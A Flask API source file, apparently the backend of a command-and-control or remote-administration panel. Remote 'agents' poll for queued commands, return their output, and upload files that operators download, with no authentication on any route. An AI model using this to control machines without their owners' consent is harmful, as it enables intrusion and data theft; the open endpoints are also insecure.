# apps/api/routes.py
# -*- encoding: utf-8 -*-
import base64, io
import threading
from collections import deque
from datetime import datetime, timedelta

from flask import Blueprint, request, jsonify, send_file

from apps.api.agent_state import update_agent, get_all_agents  # для heartbeat/статистики

api = Blueprint('api', __name__)

# ---------- Locks ----------
lock = threading.Lock()           # для файлового буфера
metrics_lock = threading.Lock()   # для метрик

# ---------- Metrics logs ----------
heartbeats_log = deque(maxlen=20000)   # datetime.utcnow() событий heartbeat
commands_log   = deque(maxlen=20000)   # datetime.utcnow() получения output (выполнена команда)
files_log      = deque(maxlen=20000)   # datetime.utcnow() получения файла

# ---------- File transfer storage ----------
# {agent_id: {filename: {"content": bytes, "ts": float}}}
files = {}

@api.route('/api/files', methods=['GET'])
def list_all_files():
    agent_filter = (request.args.get('agent_id') or '').strip()
    out = []

    with lock:
        for agent_id, bucket in files.items():
            if agent_filter and agent_id != agent_filter:
                continue
            for name, meta in bucket.items():
                size = len(meta.get("content", b""))
                ts   = meta.get("ts")
                # удобочитаемая дата
                ts_iso = datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S") if ts else ""
                out.append({
                    "agent_id": agent_id,
                    "filename": name,
                    "size": size,
                    "received_at": ts_iso,
                    "download_url": f"/api/agent/{agent_id}/files/{name}"
                })

    # сортируем по дате убыв.
    out.sort(key=lambda x: x["received_at"], reverse=True)
    return jsonify({"files": out})

@api.route('/api/agent/<agent_id>/files/<path:filename>', methods=['GET'])
def download_named(agent_id, filename):
    with lock:
        bucket = files.get(agent_id) or {}
        meta = bucket.get(filename)
        if not meta:
            return "File not found", 404

        content = meta.get("content", b"")
        return send_file(
            io.BytesIO(content),
            as_attachment=True,
            download_name=filename
        )

def _bucket_count(timestamps, start, end, step, fmt):
    """
    Группирует timestamps (datetime) по интервалам [start, end) с шагом step.
    Возвращает (labels, counts).
    """
    buckets = []
    labels  = []
    t = start
    while t < end:
        t2 = t + step
        labels.append(t.strftime(fmt))
        buckets.append(0)
        t = t2

    for ts in list(timestamps):
        if start <= ts < end:
            idx = int((ts - start) / step)
            if 0 <= idx < len(buckets):
                buckets[idx] += 1

    return labels, buckets

@api.route('/api/agent/<agent_id>/file', methods=['POST'])
def receive_file(agent_id):
    data = request.json or {}
    name = (data.get("name") or "").strip()
    b64  = (data.get("data") or "").strip()
    if not name or not b64:
        return jsonify({"error": "name and data are required"}), 400

    try:
        raw = base64.b64decode(b64)
    except Exception as e:
        return jsonify({"error": f"bad base64: {e}"}), 400

    with lock:
        files.setdefault(agent_id, {})[name] = {
            "content": raw,
            "ts": datetime.utcnow().timestamp()
        }

    # метрика: получен файл
    with metrics_lock:
        files_log.append(datetime.utcnow())

    return jsonify({"status": "stored", "name": name})

@api.route('/api/agent/<agent_id>/files/latest', methods=['GET'])
def download_latest(agent_id):
    bucket = files.get(agent_id) or {}
    if not bucket:
        return "No files for this agent", 404
    name, meta = max(bucket.items(), key=lambda kv: kv[1]["ts"])
    return send_file(
        io.BytesIO(meta["content"]),
        as_attachment=True,
        download_name=name
    )

# ---------- Commands ----------
commands = {}  # {agent_id: "command"}
results  = {}  # {agent_id: "output"}

@api.route('/api/agent/<agent_id>/command', methods=['POST'])
def send_command(agent_id):
    data = request.json or {}
    cmd = (data.get('command') or "").strip()
    if not cmd:
        return jsonify({'error': 'Command is required'}), 400
    commands[agent_id] = cmd
    return jsonify({'status': 'Command queued'})

@api.route('/api/agent/<agent_id>/output', methods=['POST'])
def receive_output(agent_id):
    data = request.json or {}
    output = data.get("output", "")
    results[agent_id] = output

    # метрика: выполнена команда (пришёл output)
    with metrics_lock:
        commands_log.append(datetime.utcnow())

    return jsonify({"status": "output received"})

@api.route('/api/agent/<agent_id>/get_output', methods=['GET'])
def get_output(agent_id):
    return jsonify({"output": results.pop(agent_id, "")})

# ---------- Heartbeat (для дашборда) ----------
@api.route("/api/heartbeat", methods=["POST"])
def heartbeat():
    data = request.json or {}
    agent_id = data.get("id")
    if not agent_id:
        return jsonify({"error": "id required"}), 400

    # обновляем инфу об агенте (IP берём из запроса)
    update_agent(agent_id, data, request.remote_addr)

    # метрика: heartbeat
    with metrics_lock:
        heartbeats_log.append(datetime.utcnow())

    # берём команду, если есть
    cmd = commands.pop(agent_id, None)

    return jsonify({
        "status": "ok",
        "command": cmd
    })

# ---------- Счётчики активных/неактивных агентов ----------
@api.route('/api/agent_stats', methods=['GET'])
def agent_stats():
    now = datetime.utcnow()
    agents = get_all_agents()
    active = 0
    inactive = 0

    for a in agents:
        # last_seen сохранён строкой "YYYY-mm-dd HH:MM:SS" -> парсим
        try:
            ls = datetime.strptime(a['last_seen'], "%Y-%m-%d %H:%M:%S")
        except Exception:
            # на всякий случай: считаем невалидное значение как неактивное
            inactive += 1
            continue

        if (now - ls).total_seconds() < 30:
            active += 1
        else:
            inactive += 1

    return jsonify({"active": active, "inactive": inactive})

# ---------- Метрики для графиков ----------
@api.route('/api/metrics/heartbeats_7d', methods=['GET'])
def metrics_heartbeats_7d():
    now = datetime.utcnow()
    start = (now - timedelta(days=6)).replace(hour=0, minute=0, second=0, microsecond=0)
    end   = (now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
    with metrics_lock:
        labels, counts = _bucket_count(heartbeats_log, start, end, timedelta(days=1), fmt='%a')
    return jsonify({"labels": labels, "data": counts})

@api.route('/api/metrics/commands_30m', methods=['GET'])
def metrics_commands_30m():
    now = datetime.utcnow()
    start = now - timedelta(minutes=29)
    end   = now + timedelta(seconds=1)
    with metrics_lock:
        labels, counts = _bucket_count(commands_log, start, end, timedelta(minutes=1), fmt='%H:%M')
    return jsonify({"labels": labels, "data": counts})

@api.route('/api/metrics/files_24h', methods=['GET'])
def metrics_files_24h():
    now = datetime.utcnow()
    # выравниваем старт по началу часа 24 часа назад
    start = now.replace(minute=0, second=0, microsecond=0) - timedelta(hours=23)
    end   = start + timedelta(hours=24)
    with metrics_lock:
        labels, counts = _bucket_count(files_log, start, end, timedelta(hours=1), fmt='%H:%M')
    return jsonify({"labels": labels, "data": counts})
